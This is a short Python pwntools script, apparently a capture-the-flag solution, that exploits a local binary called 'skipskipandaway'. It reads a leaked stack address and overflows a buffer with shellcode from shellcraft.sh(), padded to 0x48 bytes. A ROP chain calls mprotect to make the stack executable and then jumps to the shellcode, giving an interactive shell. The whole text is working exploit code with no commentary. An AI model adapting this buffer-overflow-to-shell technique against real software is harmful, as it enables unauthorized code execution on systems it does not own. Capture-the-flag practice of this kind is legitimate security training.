from pwn import *
# context 
elf = ELF("./skipskipandaway")
context.binary = elf
p = process("./skipskipandaway")


# exploit
p.sendlineafter(">>> ", "1")
p.sendlineafter(">>> ", "3")
p.recvuntil("What are you doing at 0x")
stack = int(p.recvline()[:-1], 16)
rop = ROP(elf)
rop.mprotect(stack & ~0xfff, 0x1000, 7)
rop.call(stack)
payload = asm(shellcraft.sh())
payload += b"A" * (0x48 - len(payload))
payload += rop.chain()
p.send(payload)
p.sendlineafter(">>> ", "2")
p.interactive()

